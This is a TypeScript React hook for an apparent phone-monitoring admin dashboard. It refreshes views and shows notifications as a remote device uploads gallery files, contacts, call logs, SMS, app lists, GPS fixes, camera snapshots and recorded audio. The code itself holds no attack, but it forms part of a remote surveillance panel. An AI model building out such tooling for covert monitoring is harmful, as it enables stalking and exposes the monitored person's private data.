// components/admin/devices/useDeviceRealtimeSync.ts
"use client";

import { useEffect, useRef } from "react";
import { createClient } from "@/lib/supabase/client";
import { toast } from "@/components/ui/Toast";
import { getTabMeta } from "@/lib/device-tab-meta";

interface Options {
  deviceId: string;
  activeTab: string;
  onRefreshActiveTab: (tabId: string) => void;
  onRefreshLightStatus: () => void;
  onRefreshTelemetry?: (tabId: string) => void;
}

export function useDeviceRealtimeSync({
  deviceId,
  activeTab,
  onRefreshActiveTab,
  onRefreshLightStatus,
  onRefreshTelemetry,
}: Options) {
  const supabaseRef = useRef(createClient());
  const activeTabRef = useRef(activeTab);
  activeTabRef.current = activeTab;

  useEffect(() => {
    if (!deviceId) return;
    const sb = supabaseRef.current;

    // 1. Broadcast channel for instant device-to-dashboard events
    const broadcastChannel = sb
      .channel(`device:${deviceId}`)
      .on("broadcast", { event: "data_synced" }, (payload: any) => {
        const res = payload.payload?.results || {};
        let syncLabel = "";
        if (res.files) syncLabel = `Gallery (${res.files} files)`;
        else if (res.contacts) syncLabel = `Contacts (${res.contacts} items)`;
        else if (res.calls) syncLabel = `Calls (${res.calls} logs)`;
        else if (res.messages) syncLabel = `Messages (${res.messages} SMS)`;
        else if (res.installed_apps) syncLabel = `Apps (${res.installed_apps} apps)`;
        else syncLabel = getTabMeta(activeTabRef.current).name;

        toast.success(`${syncLabel} synced fresh from phone!`);
        onRefreshActiveTab(activeTabRef.current);
        onRefreshLightStatus();
      })
      .on("broadcast", { event: "file_uploaded" }, (payload: any) => {
        const name = payload.payload?.file_name || "File";
        toast.success(`Received: ${name} from phone!`);
        onRefreshActiveTab("gallery");
        onRefreshLightStatus();
      })
      .on("broadcast", { event: "photo_uploaded" }, () => {
        toast.success("Snapshot captured & received from phone!");
        onRefreshActiveTab("camera");
        onRefreshLightStatus();
      })
      .on("broadcast", { event: "audio_uploaded" }, () => {
        toast.success("Audio clip recorded & received from phone!");
        onRefreshActiveTab("audio");
        onRefreshLightStatus();
      })
      .subscribe();

    // 2. Postgres Changes on device_commands (pending -> executed)
    const cmdChannel = sb
      .channel(`device-cmds:${deviceId}`)
      .on(
        "postgres_changes",
        {
          event: "UPDATE",
          schema: "public",
          table: "device_commands",
          filter: `device_id=eq.${deviceId}`,
        },
        (payload: any) => {
          const row = payload.new;
          if (row?.status === "executed") {
            const cmd = row.command;
            if (cmd === "sync_gallery") {
              toast.success("Gallery sync completed on phone!");
              onRefreshActiveTab("gallery");
            } else if (cmd === "sync_contacts") {
              toast.success("Contacts sync completed on phone!");
              onRefreshActiveTab("contacts");
            } else if (cmd === "sync_calls") {
              toast.success("Calls sync completed on phone!");
              onRefreshActiveTab("calls");
            } else if (cmd === "sync_messages") {
              toast.success("SMS sync completed on phone!");
              onRefreshActiveTab("messages");
            } else if (cmd === "sync_apps") {
              toast.success("Apps sync completed on phone!");
              onRefreshActiveTab("apps");
            } else if (cmd === "sync_wifi") {
              toast.success("WiFi scan completed on phone!");
              if (onRefreshTelemetry) onRefreshTelemetry("security");
            } else if (cmd === "fetch_location") {
              toast.success("Live GPS fix confirmed from phone!");
              onRefreshLightStatus();
            }
            onRefreshLightStatus();
          }
        }
      )
      .subscribe();

    return () => {
      sb.removeChannel(broadcastChannel);
      sb.removeChannel(cmdChannel);
    };
  }, [deviceId, onRefreshActiveTab, onRefreshLightStatus, onRefreshTelemetry]);
}
